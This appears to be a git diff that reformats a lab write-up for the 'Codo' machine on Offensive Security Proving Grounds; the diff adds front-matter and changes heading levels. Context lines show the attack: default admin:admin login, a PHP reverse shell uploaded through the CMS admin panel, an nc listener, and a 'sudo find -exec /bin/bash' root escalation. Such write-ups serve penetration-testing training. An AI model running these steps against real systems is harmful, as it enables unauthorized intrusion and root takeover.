@@ -1,8 +1,15 @@
+---
+title: "Codo"
+difficulty: easy
+os: linux
+description: "Codo — Offensive Security Proving Grounds easy linux writeup."
+---
+
 # Codo
 
 > Codo CMS / sudo find
 
-### Enumerating Services
+## Enumerating Services
 First, we'll perform a generic scan to identify the open ports and services running on this machine.
 ```shell
 # TCP
@@ -13,13 +20,13 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-### Enumerating port 80
+## Enumerating port 80
 Found Codo CMS. Default credentials admin:admin worked.
 ```shell
 # Enum dir
 feroxbuster -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -d 2 -x php,html -C 404,502 -u http://192.168.182.87
 ```
-### Initial Access
+## Initial Access
 Codo CMS allows file upload with PHP content.
 ```shell
 # Upload PHP reverse shell via admin panel
@@ -33,7 +40,7 @@ rlwrap -cAra nc -vnlp 443
 # Evidence
 cat /var/www/html/local.txt
 ```
-### Privilege Escalation
+## Privilege Escalation
 ```shell
 # Sudo check
 sudo -l
@@ -43,7 +50,7 @@ User www-data may run the following commands:
 # Privilege Escalation via GTFOBins
 sudo find . -exec /bin/bash \; -quit
 ```
-### Post-Exploitation
+## Post-Exploitation
 ```shell
 # Evidence
 cat /root/proof.txt
